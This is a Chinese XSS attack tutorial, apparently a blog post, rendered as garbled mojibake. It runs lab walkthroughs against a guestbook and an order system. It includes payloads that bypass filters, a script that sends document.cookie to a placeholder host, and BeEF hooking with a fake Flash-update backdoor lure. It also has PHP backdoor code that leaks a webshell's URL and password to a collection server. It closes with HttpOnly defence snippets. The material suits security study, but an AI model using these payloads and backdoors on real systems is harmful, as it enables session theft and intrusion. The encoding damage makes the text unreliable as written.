ï¼ˆ2ï¼‰æ”»å‡»æ–¹å¼&emsp;&emsp;è¿™ç§æ”»å‡»å¤šè§äºè®ºå›ã€åšå®¢å’Œç•™è¨€æ¿ä¸­ï¼Œæ”»å‡»è€…åœ¨å‘å¸–çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸çš„ä¿¡æ¯ä¸€èµ·æ³¨å…¥å¸–å­çš„å†…å®¹ä¸­ã€‚éšç€å¸–å­è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿæ°¸ä¹…çš„å­˜æ”¾åœ¨æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬ä¼šåœ¨å®ƒä»¬çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œ ï¼ˆ3ï¼‰payload&lt;img src=&quot;1&quot; onerror=&quot;alert(/xss/)&quot;/&gt; æ³¨å…¥åé‡æ–°åˆ·æ–°å‘ç°ç›´æ¥å›æ˜¾æ³¨å…¥çš„ä¸œè¥¿ï¼Œè¯´æ˜æ˜¯å­˜å‚¨å‹xss 3ã€DOMå‹ ï¼ˆ1ï¼‰åŸç†&emsp;&emsp;æ–‡æ¡£å¯¹è±¡æ¨¡å‹Document Object Modelï¼ˆDOMï¼‰æ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€ä¸ç›¸å¹²çš„æ¥å£ï¼Œå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœä¼šæˆä¸ºå±•ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ† &emsp;&emsp;DOMå‹xsså…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹xssï¼Œä¹Ÿè¢«ç§°ä½œæœ¬åœ°è·¨ç«™ï¼Œå®ƒæ˜¯åŸºäºDOMæ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ã€‚DOM XSSå’Œåå°„å‹XSSã€å­˜å‚¨å‹XSSçš„åŒºåˆ«åœ¨äºDOM XSSä»£ç å¹¶ä¸éœ€è¦æœåŠ¡å™¨å‚ä¸ï¼Œå‡ºå‘XSSé çš„æ˜¯æµè§ˆå™¨çš„DOMè§£æï¼Œå®Œå…¨æ˜¯å®¢æˆ·ç«¯çš„äº‹æƒ… &emsp;&emsp;DOMä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›å¯¹è±¡å¯ä»¥è¢«ç”¨æˆ·æ‰€æ“çºµï¼Œå¦‚urlï¼Œlocationç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMæ¥åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œæ˜¯ä»å®¢æˆ·ç«¯å–å¾—DOMä¸­çš„æ•°æ®åå¹¶åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå› æ­¤ä»…ä»æœåŠ¡å™¨ç«¯æ˜¯æ²¡æœ‰åŠæ³•é˜²å¾¡DOMå‹XSSæ¼æ´çš„ï¼Œå¦‚è‹¥DOMä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„éªŒè¯ï¼Œä¾¿ä¼šäº§ç”ŸåŸºäºDOMçš„XSSæ¼æ´ã€‚ &emsp;&emsp;åŸºäºDOMçš„XSSæ˜¯åå°„çš„ç‰¹ä¾‹ï¼Œå…¶ä¸­JavaScriptéšè—åœ¨URLä¸­ï¼Œå¹¶åœ¨å…¶å‘ˆç°æ—¶ç”±é¡µé¢ä¸­çš„JavaScriptå–å‡ºï¼Œè€Œä¸æ˜¯åœ¨æä¾›æœåŠ¡æ—¶åµŒå…¥åˆ°é¡µé¢ä¸­ã€‚è¿™å¯ä»¥ä½¿å…¶æ¯”å…¶ä»–æ”»å‡»æ›´éšè”½ï¼Œå¹¶ä¸”ç›‘æ§é¡µé¢æ­£æ–‡çš„WAFæˆ–å…¶ä»–é˜²æŠ¤æ£€æµ‹ä¸å‡ºæ¶æ„å†…å®¹ã€‚ ï¼ˆ2ï¼‰æ”»å‡»æ–¹å¼&emsp;&emsp;ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„URLï¼Œå®ƒç”±æ”»å‡»è€…æäº¤ï¼Œè€Œä¸”å…¶ä¸­åŒ…å«xssä»£ç ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•çš„å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ï¼Œå½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†xssä»£ç ï¼Œå¯¼è‡´å­˜åœ¨xssæ¼æ´ ï¼ˆ3ï¼‰payload &lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt; å››ã€XSSæ”»å‡»çš„é€”å¾„XSSæ”»å‡»æ–¹æ³•åªæ˜¯åˆ©ç”¨HTMLçš„å±æ€§åšå„ç§å°è¯•ï¼Œæ‰¾å‡ºæ³¨å…¥çš„æ–¹æ³•ã€‚ç°åœ¨å¯¹ä¸‰ç§XSSæ”»å‡»çš„ä¸»è¦æ–¹å¼è¿›è¡Œåˆ†æã€‚ ç¬¬ä¸€ç§ï¼šå¯¹æ™®é€šçš„ç”¨æˆ·è¾“å…¥ï¼Œé¡µé¢åŸæ ·è¾“å‡ºï¼Œæ”»å‡»è€…é€šè¿‡å¯¹JSCODEçš„ä¼ªè£…ï¼Œç»è¿‡æŸäº›ç‰¹å®šçš„æ“ä½œå°±ä¼šè·³å‡ºä¸€ä¸ªæœ¨é©¬ç•Œé¢ï¼Œä»è€Œå–å¾—ç™»å½•ç”¨æˆ·çš„Cookie. ç¬¬äºŒç§ï¼šåœ¨ä»£ç åŒºå†…å­˜åœ¨æœ‰ç”¨æˆ·è¾“å…¥çš„å†…å®¹ ç¬¬ä¸‰ç§ï¼šå…è®¸ç”¨æˆ·è¾“å…¥HTMLæ ‡ç­¾çš„é¡µé¢ï¼Œç”¨æˆ·å¯ä»¥æäº¤ä¸€äº›è‡ªå®šä¹‰çš„HTMLä»£ç ã€‚ äº”ã€é¶åœºå®æˆ˜1ã€PHPå¼€æºå¤šåŠŸèƒ½ç•™è¨€æ¿ï¼ˆ1ï¼‰æ­å»ºé¶åœºPHPå¼€æºå¤šåŠŸèƒ½ç•™è¨€æ¿ä¸‹è½½åœ°å€ï¼šhttps://down.chinaz.com/soft/37581.htm ï¼ŒæŒ‰ç…§æ•™ç¨‹å®‰è£…å³å¯ ï¼ˆ2ï¼‰XSSå¹³å° ç½‘å€1ï¼šhttps://xss.pt/xss.php ç½‘å€2ï¼šhttp://xss.fbisb.com/xss.php ç½‘å€3ï¼šhttps://xss8.cc/login/ ç½‘å€4ï¼šhttps://xsshs.cn/xss.php?do=login ï¼ˆ3ï¼‰è¿›è¡Œæ”»å‡»â‘  åˆæ¬¡å°è¯•å°è¯•ç”¨ç®€å•çš„JSä»£ç è¿›è¡ŒXSSæ”»å‡» å­˜åœ¨JSè¿‡æ»¤ â‘¡ ç»•è¿‡&lt;script&gt;æ£€æµ‹ä½¿ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡&lt;script &gt;è¿‡æ»¤ï¼š&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt; æˆåŠŸå¼¹å‡ºå¼¹çª— ç®¡ç†å‘˜åå°æŸ¥çœ‹ä¹Ÿä¼šå¼¹å‡ºå¼¹çª— è€Œå¼¹å‡ºå¼¹çª—çš„åŸå› å°±æ˜¯è¿™å¥JSä»£ç åµŒå…¥åˆ°äº†ä»£ç ä¸­ â‘¢ åˆ©ç”¨XSSå¹³å°è·å–cookieæ­¤æ—¶åˆ©ç”¨XSSå¹³å°ï¼Œå¯ç”¨é»˜è®¤æ¨¡å—ï¼Œå› ä¸ºè¿™ä¸ªç•™è¨€æ¿ä¼šè¿‡æ»¤&lt;script&gt;æ ‡ç­¾ï¼Œå› æ­¤æˆ‘é€‰æ‹©ä½¿ç”¨imgæ ‡ç­¾è¿›è¡ŒXSSæ”»å‡» å‘é€payloadæˆåŠŸ ç®¡ç†å‘˜åˆ°åå°æŸ¥çœ‹ç•™è¨€ æ­¤æ—¶XSSå¹³å°å°±æœ‰è®°å½•äº† â‘£ ä½¿ç”¨firebugç™»å½•åå°è·å–åˆ°è®¿é—®çš„URLï¼š URLï¼šhttp://192.168.100.120/SyGuestBook_v1.2/index.php?c=adminMessage&amp;a=ListMessage&amp;gid=1Cookieï¼švalueName=w01ke; valueQq=5201314; PHPSESSID=en5mt3n1snl0hvg6d45mji2a95 ç”¨è·å–åˆ°çš„cookieå’Œåå°é“¾æ¥ï¼Œä½¿ç”¨firebugè¿›è¡Œè®¾ç½® æˆåŠŸè¿›å…¥åå°ï¼ &emsp;&emsp;æ³¨æ„ï¼šå› ä¸ºæ˜¯ç•™è¨€æ¿ï¼Œå› æ­¤åˆ«äººæŸ¥çœ‹æˆ‘ä»¬ç•™ä¸‹çš„XSSæ”»å‡»ä»£ç æ—¶ï¼Œä¹Ÿä¼šè®°å½•åˆ°XSSå¹³å°ï¼Œå› æ­¤æŸ¥çœ‹XSSå¹³å°çš„è®°å½•æ—¶æ³¨æ„ç”„åˆ«è®¿å®¢å’Œç®¡ç†å‘˜ 2ã€BUUCTF-basic-BUU XSS COURSE 1 ğŸ‘‰ã€ŠBUUCTF-basic-BUU XSS COURSE 1ã€‹ğŸ‘ˆ 3ã€è®¢å•ç³»ç»Ÿâ€”â€”å†›é”‹çœŸäººCSé‡æˆ˜123ï¼ˆ1ï¼‰é¶åœºä¸‹è½½é“¾æ¥ï¼šhttps://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg ï¼Œæå–ç ï¼šrtra ï¼ˆ2ï¼‰é¶åœºå®‰è£…æ³¨æ„ä¸‹è½½å®‰è£…å¥½åä»”ç»†æŸ¥çœ‹å®‰è£…è¯´æ˜ï¼Œæ¯”å¦‚config.phpçš„æ•°æ®åº“è´¦å¯†è¦å¯¹ï¼Œå¦åˆ™è¿æ¥ä¸ä¸Šæ•°æ®åº“ å¦‚æœè®¿é—®install.phpæç¤ºä»¥ä¸‹ä¿¡æ¯ï¼ŒæŒ‰ç…§æç¤ºæ“ä½œå³å¯ åœ¨çœŸå®æœºéƒ¨ç½²ç¯å¢ƒæ—¶å‡ºç°äº†ä¸€ç³»åˆ—é—®é¢˜ï¼ˆåå°ç™»å½•é¡µé¢éªŒè¯ç æ— æ³•æ˜¾ç¤ºï¼‰ï¼Œæˆ‘æ˜¯åœ¨Win7è™šæ‹Ÿæœºï¼ŒPHPç‰ˆæœ¬ä¸º5.3.29éƒ¨ç½²æˆåŠŸçš„ ï¼ˆ3ï¼‰è¿›è¡Œæ”»å‡»â‘  åˆæ¬¡å°è¯•æ”»å‡»è€…åœ¨å…·ä½“è¦æ±‚ä¸€æ æ„é€ payloadï¼š&lt;script&gt;alert(1)&lt;/script&gt; ç®¡ç†å‘˜åœ¨åå°è¿›è¡ŒæŸ¥çœ‹æ—¶å°±ä¼šå¼¹å‡ºå¼¹çª— æ­£æ˜¯å› ä¸ºæˆ‘ä»¬çš„JSä»£ç åµŒå…¥åˆ°äº†å…¶ä¸­ â‘¡ XSSå¹³å°è·å–cookieé€‰æ‹©XSSå¹³å°çš„æ”»å‡»ä»£ç  æäº¤ ç®¡ç†å‘˜åœ¨åå°æŸ¥çœ‹æ—¶å°±ä¼šè§¦å‘æ”»å‡»ä»£ç  æ­¤æ—¶åœ¨XSSå¹³å°å°±èƒ½æŸ¥çœ‹åˆ°è·å–çš„ä¿¡æ¯ â‘¢ postmanç™»å½•åå°postmanä¸‹è½½åœ°å€ï¼šhttps://www.postman.com/downloads/ ï¼ˆ4ï¼‰Beefç»“åˆXSSæ”»å‡»â‘  å®‰è£…Beef-xssæœ€æ–°ç‰ˆkaliå®‰è£…beef-xss apt-get install beef-xss å¦‚æœé‡åˆ°æ‰¾ä¸åˆ°åŒ… è§£å†³æ–¹æ¡ˆ # ç¼–è¾‘æ–‡ä»¶sudo vim /etc/apt/sources.list# æ·»åŠ æ—§çš„èµ„æºä¿¡æ¯deb http://http.kali.org/kali kali-rolling main contrib non-free# For source package access, uncomment the following line# deb-src http://http.kali.org/kali kali-rolling main contrib non-freedeb http://http.kali.org/kali sana main non-free contribdeb http://security.kali.org/kali-security sana/updates main contrib non-free# For source package access, uncomment the following line# deb-src http://http.kali.org/kali sana main non-free contrib# deb-src http://security.kali.org/kali-security sana/updates main contrib non-freedeb http://old.kali.org/kali moto main non-free contrib# For source package access, uncomment the following line# deb-src http://old.kali.org/kali moto main non-free contrib# æ›´æ–°èµ„æºåˆ—è¡¨sudo apt-get update æ›´æ–°å®Œæ¯•åé‡æ–°å®‰è£…ç›®æ ‡åº”ç”¨å³å¯ å®‰è£…å®Œæˆåï¼Œç›´æ¥ä½¿ç”¨beef-xsså¯åŠ¨ä¼šæœ‰å¯åŠ¨å¤±è´¥çš„é—®é¢˜ï¼Œç›®å‰è¿˜ä¸çŸ¥é“è§£å†³æ–¹æ³• ä½†æ˜¯å¯ä»¥è¿›å…¥/usr/share/beef-xss/ç›®å½•ï¼Œä½¿ç”¨./beefå¯åŠ¨å³å¯ å¦‚æœéœ€è¦ä¿®æ”¹ç™»å½•è´¦å·å¯†ç å¯ä»¥ä¿®æ”¹config.yamlæ–‡ä»¶ â‘¡ ä½¿ç”¨beef-xsså¯åŠ¨beefåï¼Œæ’å…¥é’©å­ï¼Œæäº¤ åå°ç®¡ç†å‘˜æŸ¥çœ‹è®¢å•è§¦å‘XSS æˆåŠŸä¸Šçº¿ è·å–Cookie æµè§ˆå™¨è·³è½¬ ç¤¾å·¥æ”»å‡»ï¼Œåˆ©ç”¨æ¨¡æ‹ŸFlashæ›´æ–°å‘å®¢æˆ·ç«¯å‘é€è¯·æ±‚ï¼Œæ¥å®ç°ä¸‹è½½åé—¨ å®¢æˆ·ç«¯æ˜¾ç¤ºï¼Œç‚¹å‡»å°±ä¸‹è½½åé—¨ 4ã€WebShellç®±å­ç®¡ç†ç³»ç»Ÿ&emsp;&emsp;å°±æ˜¯ä½¿ç”¨åˆ«äººçš„webshellæ¥è¿›è¡Œè·å–æœåŠ¡å™¨shellï¼Œä½†è·å–shellåwebshellå­˜åœ¨çš„æ¶æ„ä»£ç å°±ä¼šæŠŠç½‘ç«™ä¿¡æ¯å’Œwebshellå¯†ç ï¼Œå’Œç”¨æˆ·åå‘åˆ°webshellçš„åŸä¸»äººæ¥è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œé€šè¿‡å¤§é‡è·å–çš„ç½‘ç«™shellæ¥è¿›è¡Œè´©å–ï¼Œè€Œä½¿ç”¨webshellçš„äººå°±æˆæ‰“å·¥ä»”äº†ã€‚ &emsp;&emsp;åæ€çš„æ„æ€å°±æ˜¯åƒä¸Šé¢çš„çªƒå–cookieé“ç†ä¸€æ ·é€šè¿‡å‘webshellçš„ä»£ç ä¸­æ’å…¥çªƒå–cookieçš„ä»£ç ï¼Œå½“webshell åŸæ³¨å…¥æŸ¥çœ‹æ²™ç®±æ—¶å°±ä¼šè§¦å‘xssçªƒå–cookieæ¥è¾¾åˆ°åå®¢ä¸ºä¸»ï¼ &emsp;&emsp;æ—¢ç„¶è¯´åˆ°äº†WebShellï¼Œæ¨èä¸€ä¸ªWebShellåº“ï¼šhttps://github.com/tennc/webshell ï¼ˆ1ï¼‰æ­å»ºé¶åœºâ‘  é¶åœºä¸‹è½½é¶åœºä¸‹è½½ï¼šé“¾æ¥ï¼šhttps://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA æå–ç ï¼šgay7 â‘¡ å°æ—‹é£ä¸‹è½½&emsp;&emsp;æ­å»ºä¸€ä¸ªaspçš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬è¿™é‡Œé€‰ç”¨å°æ—‹é£è¿›è¡Œæ­å»ºhttp://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zipï¼Œä¸‹è½½å®Œæˆåè§£å‹åˆ°è™šæ‹Ÿæœºé‡Œé¢ &emsp;&emsp;é»˜è®¤ç«¯å£ä¸º80ã€‚å¦‚æœ80ç«¯å£è¢«å ç”¨æˆ–ä¸æƒ³ç”¨80å¯ç”¨è®°äº‹æœ¬æ‰“å¼€host.iniå¢åŠ ç«¯å£ç½‘ç«™æœåŠ¡ â‘¢ é¶åœºæ­å»º&emsp;&emsp;å°†ä¸‹è½½å¥½çš„webshellç®±å­æ”¾åœ¨æ­å»ºå¥½çš„æœåŠ¡å™¨é‡Œé¢ï¼Œè¿™é‡Œæˆ‘æ”¾åˆ°äº†8001ç«¯å£ä¸‹ &emsp;&emsp;è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œè®¿é—®è¯¥ç½‘å€æ—¶åªèƒ½è®¿é—®http://localhost:8001/xxx ï¼Œè®¿é—®127.0.0.1æˆ–è€…å†…ç½‘IPåœ°å€éƒ½ä¼šæŠ¥418 Host Not Foundçš„é”™è¯¯ &emsp;&emsp;ç»è¿‡æ’æŸ¥ç»ˆäºçŸ¥é“æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œåªéœ€è¦å°†è¿™é‡Œä¿®æ”¹æˆå¯¹åº”çš„IPåœ°å€ï¼Œé‡å¯æœåŠ¡å³å¯ &emsp;&emsp;å‡å¦‚æˆ‘ä»¬å‘wolke.cnä¼ å…¥äº†åˆ«äººç•™äº†åé—¨çš„æœ¨é©¬ï¼Œè¿›è¡Œè¿æ¥ï¼Œè®¿é—®äº†http://10.3.14.17:8001/api.asp?url=wolke.cn&amp;pass=sqzr&amp;id=1 ï¼Œè¿™ä¸ªæ—¶å€™åˆ«äººåœ¨åå°å°±èƒ½çœ‹åˆ°æˆ‘ä»¬çš„webshellï¼Œåæ”¶æ¸”ç¿ä¹‹åˆ© ï¼ˆ2ï¼‰è¿›è¡Œæ”»å‡»â‘  æ¨¡æ‹ŸwebshellåŸä½œè€…è¿›è¡Œåé—¨æ”»å‡»&emsp;&emsp;ç™»å½•åå°ï¼ˆè´¦å·å¯†ç éƒ½ä¸ºï¼šadminï¼‰ &emsp;&emsp;å»æ‰¾ä¸€ä¸ªå…æ€WebShellï¼Œç„¶ååŠ ä¸Šæˆ‘è‡ªå·±çš„åé—¨ $password = &quot;sqzr&quot;;$url = $_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;]; // HTTP_HOSTå½“å‰è¯·æ±‚å¤´ä¸­ Host: é¡¹çš„å†…å®¹ï¼›PHP_SELFå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åecho &quot;&lt;script src=&#x27;http://10.3.14.17:8001/api.asp?url=$url&amp;pass=$password&amp;id=1&#x27;&gt;&quot;;?&gt; &emsp;&emsp;æ¨¡æ‹Ÿä¸Šä¼ WebShellåˆ°æŸç½‘ç«™ï¼Œå¹¶ä¸”è¿›è¡Œè¿æ¥è§¦å‘åé—¨ &emsp;&emsp;è¿™æ—¶æˆ‘ä»¬å°±æ‰“å¼€webshellç®±å­å‘ç°æˆ‘ä»¬çš„åé—¨äº†ï¼ˆå®éªŒæ—¶å‘ç°æœ¨é©¬è·¯å¾„å¤ªé•¿ï¼Œå³ä½¿è§¦å‘äº†åé—¨ä¹Ÿæ— æ³•è®°å½•åˆ°webshellç®±å­ä¸­å»ï¼‰ â‘¡ åæ€webshellåŸä½œè€…&emsp;&emsp;æœ‰çš„webshellåŸä½œè€…ä¼šåˆ©ç”¨åŠ å¯†ã€ç¼–ç ã€æ‹¼æ¥å­—ç¬¦ç­‰æŠ€æœ¯æ¥éšè—URLï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨åˆ«äººçš„webshellæ—¶ä¸€å®šè¦è¿›è¡Œä»£ç å®¡è®¡ &emsp;&emsp;å½“æˆ‘ä»¬ä»£ç å®¡è®¡è·å–åˆ°webshellæ²™ç®±çš„URLåï¼Œé€šè¿‡è®¿é—®webshellæ²™ç®±æ¥æ¤å…¥XSSä»£ç çªƒå–cookie &emsp;&emsp;æ­¤æ—¶æ²™ç®±ç®¡ç†å‘˜æŸ¥çœ‹PHPä¿¡å°ï¼Œå°±ä¼šçœ‹åˆ°æˆ‘ä»¬çš„æ¶æ„æ•°æ®ï¼ŒåŒæ—¶ä¹Ÿä¼šè§¦å‘XSSæ”»å‡»ä»£ç  &emsp;&emsp;XSSå¹³å°æ–°å¢è®°å½• &emsp;&emsp;ä½¿ç”¨postmanè¿›å…¥åå°ï¼Œç›´æ¥åæ€ 5ã€ä½¿ç”¨JSä»£ç è·å–Cookie&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;script&gt; å…­ã€XSSæ”»å‡»çš„æ£€æµ‹ åœ¨ç›®æ ‡ç«™ç‚¹ä¸Šæ‰¾åˆ°è¾“å…¥ç‚¹ï¼Œæ¯”å¦‚æœç´¢æ ï¼Œé”™è¯¯é¡µé¢ï¼Œç•™è¨€æ¿ç­‰ã€‚ è¾“å…¥ä¸€ç»„â€ç‰¹æ®Šå­—ç¬¦+å”¯ä¸€è¯†åˆ«å­—ç¬¦â€ï¼Œç‚¹å‡»æäº¤åï¼ŒæŸ¥çœ‹è¿”å›æºç ï¼Œæ˜¯å¦åšå¯¹åº”çš„å¤„ç†ã€‚ é€šè¿‡æœç´¢å®šä½åˆ°å”¯ä¸€è¯†åˆ«å­—ç¬¦ï¼Œç»“åˆå”¯ä¸€è¯†åˆ«å­—ç¬¦å‰åè¯­æ³•ç¡®è®¤æ˜¯å¦å¯ä»¥æ„é€ æ‰§è¡Œjsçš„æ¡ä»¶(æ„é€ é—­åˆ)ã€‚ æäº¤æ„é€ çš„è„šæœ¬ä»£ç ä»¥åŠå„ç§ç»•è¿‡å§¿åŠ¿ï¼Œçœ‹æ˜¯å¦å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œå¦‚æœæˆåŠŸæ‰§è¡Œåˆ™è¯´æ˜è¯¥ç«™ç‚¹å­˜åœ¨XSSæ¼æ´ã€‚ Tipsï¼š é€šå¸¸æœç´¢æ å®¹æ˜“å‡ºç°åå°„å‹XSSï¼Œç•™è¨€æ¿å®¹æ˜“å‡ºç°å­˜å‚¨å‹XSSï¼› æœ‰äº›ç½‘ç«™é‰´äºåå°å¯èƒ½å­˜åœ¨è¿‡æ»¤æªæ–½ï¼Œç»„å»ºçš„scriptå¯èƒ½ä¼šè¢«è¿‡æ»¤æ‰ï¼Œå› è€Œæ— æ³•ç”Ÿæ•ˆæˆ–è€…ç¯å¢ƒé™åˆ¶è„šæœ¬æ‰§è¡Œï¼› é€šè¿‡å˜åŒ–ä¸åŒçš„scriptï¼Œå°è¯•ç»•è¿‡åå°çš„è¿‡æ»¤æœºåˆ¶ã€‚ ä¸‹å›¾ä¸ºè·¨ç«™è„šæœ¬æ”»å‡»æµç¨‹å›¾ï¼ˆCookiesï¼‰ &emsp;&emsp;ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼šç”¨æˆ·è®¿é—®å­˜åœ¨XSSæ¼æ´çš„ç«™ç‚¹åè§¦å‘è„šæœ¬ï¼Œæ¼æ´ç«™ç‚¹ç»™ç”¨æˆ·è¿”å›å¸¦æœ‰æ¶æ„jsçš„é¡µé¢ï¼›ç”¨æˆ·è®¾å¤‡æ‰§è¡Œè¯¥æ¶æ„è„šæœ¬åï¼Œæ”»å‡»è€…å³å¯çªƒå–ç”¨æˆ·çš„æ•°æ®ï¼ˆcookiesï¼‰ï¼Œå¹¶ä¼ªè£…æˆç”¨æˆ·å¯¹æ¼æ´ç«™ç‚¹è¿›è¡Œæ”»å‡»ã€‚ ä¸ƒã€è·å–Sessionæ€è·¯&emsp;&emsp;æœ‰çš„æ—¶å€™è·å–äº†Cookieï¼Œä½†æ˜¯å°‘äº†Sessionï¼Œä¼šé€ æˆç™»ä¸è¿›åå° &emsp;&emsp;æœåŠ¡å™¨å¼€å¯äº†SessionéªŒè¯çš„è¯ï¼Œæˆ‘ä»¬åªè·å–å®¢æˆ·ç«¯çš„Cookieæ˜¯æ²¡æœ‰åŠæ³•é€šè¿‡éªŒè¯çš„ï¼Œ &emsp;&emsp;è€Œä¸”æˆ‘ä»¬ä¹Ÿæ— æ³•è·å–å­˜æ”¾åœ¨æœåŠ¡ç«¯çš„Session &emsp;&emsp;å¦‚æœéœ€è¦è·å–Sessionï¼Œå¯ä»¥å€ŸåŠ©è¾…åŠ©æ–‡ä»¶ï¼Œæ¯”å¦‚è®¿é—®phpæ¢é’ˆæ—¶å°±ä¼šæºå¸¦Session &emsp;&emsp;å¦‚æœèƒ½åˆ©ç”¨XSSè®©ç®¡ç†å‘˜é¡µé¢è·³è½¬åˆ°phpinfo()ç•Œé¢ï¼Œé€šè¿‡è¿”å›æºç å°±èƒ½çªƒå–Session &emsp;&emsp;åˆ©ç”¨beefè¿›è¡Œé¡µé¢è·³è½¬ &emsp;&emsp;è·å–é¡µé¢æºç  &emsp;&emsp;è·å–æºç ä¸­çš„cookieå’Œsession å…«ã€HttpOnly1ã€ä»€ä¹ˆæ˜¯HttpOnly&emsp;&emsp;å¦‚æœCookieä¸­è®¾ç½®äº†HttpOnlyå±æ€§ï¼Œé‚£ä¹ˆé€šè¿‡JSè„šæœ¬å°†æ— æ³•è¯»å–åˆ°Cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆé˜²æ­¢XSSæ”»å‡»ï¼Œçªƒå–Cookieå†…å®¹ã€‚ ä½†æ˜¯è¿˜æ˜¯å­˜åœ¨xssè·¨ç«™è¯­å¥ï¼Œé˜»æ­¢çš„ä»…ä»…æ˜¯è·å–cookie &emsp;&emsp;å„ä¸ªä¸»æµçš„è„šæœ¬è¯­è¨€éƒ½æ”¯æŒHttpOnly 2ã€HttpOnlyçš„è®¾ç½®æ ·ä¾‹ï¼ˆ1ï¼‰JavaEEresponse.setHeader(&quot;Set-Cookie&quot;, &quot;cookiename=value;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;); &emsp;&emsp;å…·ä½“å‚æ•°çš„å«ä¹‰å†æ¬¡ä¸åšé˜è¿°ï¼Œè®¾ç½®å®Œæ¯•åé€šè¿‡jsè„šæœ¬æ˜¯è¯»ä¸åˆ°è¯¥cookieçš„ï¼Œä½†ä½¿ç”¨å¦‚ä¸‹æ–¹å¼å¯ä»¥è¯»å– Cookie cookies[]=request.getCookies(); ï¼ˆ2ï¼‰C#HttpCookie myCookie = new HttpCookie(&quot;myCookie&quot;); myCookie.HttpOnly = true; Response.AppendCookie(myCookie); ï¼ˆ3ï¼‰VB.NETDim myCookie As HttpCookie = new HttpCookie(&quot;myCookie&quot;) myCookie.HttpOnly = True Response.AppendCookie(myCookie) ä½†æ˜¯åœ¨ .NET 1.1 ,ä¸­æ‚¨éœ€è¦æ‰‹åŠ¨æ·»åŠ  Response.Cookies[cookie].Path += &quot;;HTTPOnly&quot;; ï¼ˆ4ï¼‰PHPâ‰¥5.2&emsp;&emsp;PHP5.2ä»¥ä¸Šç‰ˆæœ¬å·²æ”¯æŒHttpOnlyå‚æ•°çš„è®¾ç½®ï¼ŒåŒæ ·ä¹Ÿæ”¯æŒå…¨å±€çš„HttpOnlyçš„è®¾ç½®ï¼Œåœ¨php.iniä¸­ session.cookie_httponly = &emsp;&emsp;è®¾ç½®å…¶å€¼ä¸º1æˆ–è€…TRUEï¼Œæ¥å¼€å¯å…¨å±€çš„Cookieçš„HttpOnlyå±æ€§ï¼Œå½“ç„¶ä¹Ÿæ”¯æŒåœ¨ä»£ç ä¸­æ¥å¼€å¯ï¼š &lt;?php ini_set(&quot;session.cookie_httponly&quot;, 1); // or session_set_cookie_params(0, NULL, NULL, NULL, TRUE); ?&gt; &emsp;&emsp;Cookieæ“ä½œå‡½æ•°setcookieå‡½æ•°å’Œsetrawcookieå‡½æ•°ä¹Ÿä¸“é—¨æ·»åŠ äº†ç¬¬7ä¸ªå‚æ•°æ¥åšä¸ºHttpOnlyçš„é€‰é¡¹ï¼Œå¼€å¯æ–¹æ³•ä¸ºï¼š setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); ï¼ˆ5ï¼‰PHP4å’ŒPHPâ‰¤5.1&emsp;&emsp;å¯¹äºPHP5.1ä»¥å‰ç‰ˆæœ¬ä»¥åŠPHP4ç‰ˆæœ¬çš„è¯ï¼Œåˆ™éœ€è¦é€šè¿‡headerå‡½æ•°æ¥å˜é€šä¸‹äº†ï¼š &lt;?php header(&quot;Set-Cookie: hidden=value; httpOnly&quot;);?&gt; 